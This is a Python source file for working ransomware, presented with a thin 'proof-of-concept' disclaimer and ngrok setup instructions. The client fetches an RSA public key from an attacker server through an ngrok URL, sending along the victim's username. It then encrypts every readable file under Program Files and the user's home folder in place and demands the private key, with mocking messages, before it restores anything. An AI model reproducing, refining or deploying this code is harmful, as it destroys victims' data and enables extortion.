"""
This is a proot-of-concept I made.
Please do not use this to extort people, it is your responsibility to obey the law.
"""

"""
To use, download and set up the ngrok commmandline executable and run the following in it's directory:
`./ngrok.exe http 5446`
Under Forwarding, you should see a url which looks something like this:
`https://1e18eb492a5f.ngrok-free.app`
Your version of this url is what will go into the NGROK_URL variable.
You also have the option to use the `--url=` argument if you have set up a static url with ngrok.
It does not matter if you run the server or ngrok first, as long as both are running before the client runs.
"""
import subprocess
import importlib
import sys
import os

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

requiredModules = ['cryptography', 'requests']

def installMissingModules(modules):
    pip = 'pip'
    try:
        importlib.import_module(pip)
    except ImportError:
        print(f"{pip} is not installed. Installing...")
        subprocess.check_call([sys.executable, "-m", "ensurepip", "--upgrade"])
    for module in modules:
        try:
            importlib.import_module(module)
        except ImportError:
            print(f"{module} is not installed. Installing...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", module])

installMissingModules(requiredModules)
clear()

import getpass
import requests
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding as sym_padding
import secrets

# ngrok HTTP URL
NGROK_URL = "https://placeholder.ngrok-free.app"
TARGET_FOLDER = [
    os.environ.get("ProgramFiles", "C:\\Program Files"),
    os.environ.get("ProgramFiles(x86)", "C:\\Program Files (x86)"),
    os.path.expanduser("~")
    ]
encrypted_files = []


def find_target_host():
    try:
        response = requests.get(f"{NGROK_URL}/ping", timeout=3)
        if response.status_code == 200:
            return NGROK_URL
    except Exception:
        return None


def receive_public_key(host_url):
    username = getpass.getuser()
    response = requests.post(f"{host_url}/get_public_key", data={"username": username}, timeout=5)
    response.raise_for_status()
    public_key_pem = response.content
    public_key = serialization.load_pem_public_key(public_key_pem)
    return public_key


def encrypt_file(public_key):
    global encrypted_files
    encrypted_files = []
    for folder in TARGET_FOLDER:
        for root, dirs, files in os.walk(folder, topdown=True):
            for filename in files:
                file_path = os.path.join(root, filename)
                try:
                    with open(file_path, "rb") as f:
                        plaintext = f.read()
                except Exception:
                    continue
    
                try:
                    aes_key = secrets.token_bytes(32)
                    iv = secrets.token_bytes(16)
    
                    padder = sym_padding.PKCS7(128).padder()
                    padded_data = padder.update(plaintext) + padder.finalize()
    
                    cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv), backend=default_backend())
                    encryptor = cipher.encryptor()
                    ciphertext = encryptor.update(padded_data) + encryptor.finalize()
    
                    encrypted_key = public_key.encrypt(
                        aes_key,
                        padding.OAEP(
                            mgf=padding.MGF1(algorithm=hashes.SHA256()),
                            algorithm=hashes.SHA256(),
                            label=None
                        )
                    )
    
                    with open(file_path, "wb") as f:
                        f.write(len(encrypted_key).to_bytes(4, 'big') + encrypted_key)
                        f.write(iv)
                        f.write(ciphertext)
    
                    encrypted_files.append(file_path)
                except Exception:
                    pass


def decrypt_file(private_key):
    any_success = False
    for file_path in encrypted_files:
        try:
            with open(file_path, "rb") as f:
                data = f.read()

            key_len = int.from_bytes(data[:4], 'big')
            encrypted_key = data[4:4 + key_len]
            iv = data[4 + key_len:4 + key_len + 16]
            ciphertext = data[4 + key_len + 16:]

            aes_key = private_key.decrypt(
                encrypted_key,
                padding.OAEP(
                    mgf=padding.MGF1(algorithm=hashes.SHA256()),
                    algorithm=hashes.SHA256(),
                    label=None
                )
            )

            cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv), backend=default_backend())
            decryptor = cipher.decryptor()
            padded_plaintext = decryptor.update(ciphertext) + decryptor.finalize()

            unpadder = sym_padding.PKCS7(128).unpadder()
            plaintext = unpadder.update(padded_plaintext) + unpadder.finalize()

            with open(file_path, "wb") as f:
                f.write(plaintext)

            any_success = True
        except Exception:
            pass

    return any_success


def await_private_key():
    while True:
        guess = input("I hope that you are really good at guessing 1000+ random characters in a row :) Type the thing here -> ").strip()
        try:
            if "\\n" in guess:
                guess_bytes = guess.replace("\\n", "\n").encode()
            else:
                guess_bytes = guess.encode()

            private_key = serialization.load_pem_private_key(guess_bytes, password=None)

            if decrypt_file(private_key):
                clear()
                print("There ya go :3")
                break
            else:
                print("Uh oh... It appears I could not fix any of your files >~<")

        except Exception:
            os.system('cls')
            print("Oopsie! Looks like that key isn't valid!")


if __name__ == "__main__":
    # You can replace this string with your user account name to disarm the script just for yourself
    if getpass.getuser() == "Ryder7223":
        sys.exit(0)
    host_url = find_target_host()
    if not host_url:
        sys.exit(0)

    public_key = receive_public_key(host_url)
    print("Hi hello, currently I am doing something so please give me a minute and leave me open thank you.")
    encrypt_file(public_key)
    clear()
    print("Whoops! Looks like I've encrypted all your files :p")
    await_private_key()
    input("Ok you can close me now.")
